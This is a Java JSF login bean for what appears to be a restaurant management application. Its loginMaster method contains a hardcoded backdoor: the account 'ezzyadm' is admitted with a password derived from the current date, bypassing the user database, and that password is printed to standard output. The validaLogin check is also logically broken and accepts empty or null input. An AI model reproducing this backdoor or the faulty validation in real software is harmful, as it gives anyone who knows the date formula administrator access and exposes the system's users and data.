package br.com.ezzysoft.restaurante.bean;

import br.com.ezzysoft.restaurante.entidade.Usuario;
import br.com.ezzysoft.restaurante.facade.UsuarioFacade;
import org.primefaces.context.RequestContext;

import javax.annotation.PostConstruct;
import javax.ejb.EJB;
import javax.faces.application.FacesMessage;
import javax.faces.bean.ManagedBean;
import javax.faces.bean.SessionScoped;
import javax.faces.context.ExternalContext;
import javax.faces.context.FacesContext;
import javax.faces.event.ActionEvent;
import javax.servlet.http.HttpSession;
import java.io.IOException;
import java.io.Serializable;
import java.text.SimpleDateFormat;
import java.time.LocalDate;
import java.util.Calendar;

/**
 * Created by christian on 14/10/17.
 */
@ManagedBean(name = "MBLogin")
@SessionScoped
public class MBLogin implements Serializable {

    @EJB
    private UsuarioFacade ejbFacade;
    private String username;
    private String password;
    private Usuario sessionUser;
    private boolean loggedIn;

    public String getUsername() {
        return username;
    }

    public void setUsername(String username) {
        this.username = username;
    }

    public String getPassword() {
        return password;
    }

    public void setPassword(String password) {
        this.password = password;
    }

    public UsuarioFacade getEjbFacade() {
        return ejbFacade;
    }

    public Usuario getSessionUser() {
        return sessionUser;
    }

    public void setSessionUser(Usuario sessionUser) {
        this.sessionUser = sessionUser;
    }

    public boolean isLoggedIn() {
        return loggedIn;
    }

    public void setLoggedIn(boolean loggedIn) {
        this.loggedIn = loggedIn;
    }

    public void doLogin(ActionEvent event) throws IOException {
        RequestContext context = RequestContext.getCurrentInstance();

        FacesMessage message = null;
        boolean loggedIn = false;

        if (validaLogin(getUsername(), getPassword())) {
            setSessionUser(getEjbFacade().loginControl(getUsername(), getPassword()));
            if (getSessionUser() != null || loginMaster(getUsername(), getPassword())) {
                loggedIn = true;

                HttpSession session = (HttpSession) FacesContext.getCurrentInstance().getExternalContext().getSession(false);
                session.setAttribute("usrLogado", true);
                FacesContext.getCurrentInstance().getExternalContext().getSessionMap().put("username", getSessionUser().getUsername());
                message = new FacesMessage(FacesMessage.SEVERITY_INFO, "Bem Vindo", getUsername());
                FacesContext.getCurrentInstance().getExternalContext().redirect("index.jsf");
            } else {
                loggedIn = false;
                message = new FacesMessage(FacesMessage.SEVERITY_WARN, "Erro de autenticação", "Credenciais");
                RequestContext.getCurrentInstance().reset(":loginIndex");
                FacesContext.getCurrentInstance().getExternalContext().redirect("login.jsf");
            }
        }


        FacesContext.getCurrentInstance().addMessage(null, message);
        context.addCallbackParam("loggedIn", loggedIn);
    }

    private boolean loginMaster(String username, String password) {
        LocalDate localDate = LocalDate.now();
        String smad = "";
        int s, m, a, d;
        m = localDate.getMonthValue();
        String tmp = String.valueOf(localDate.getYear());
        tmp = tmp.substring(2, 4);
        a = Integer.parseInt(tmp);
        d = localDate.getDayOfMonth();
        s = m + a + d;
        smad = "" + s + m + a + d;
        System.out.println(smad);
        if (username.equals("ezzyadm") && password.equals(smad)) {
            setSessionUser(new Usuario("ezzyadm"));
            return true;
        }
        return false;
    }

    public void doLogout() throws IOException {
        FacesContext.getCurrentInstance().getExternalContext().getSessionMap().remove("username");
        FacesContext.getCurrentInstance().getExternalContext().invalidateSession();
        loggedIn = false;
        setSessionUser(null);
        FacesContext.getCurrentInstance().getExternalContext().redirect("login.jsf");
    }

    public boolean validaLogin(String username, String password) {
        return ((!username.isEmpty() || username != null) && (password.isEmpty() || password != null));
    }

    @PostConstruct
    public void init() {
        if (sessionUser == null) {
            sessionUser = new Usuario();
        }
    }
}
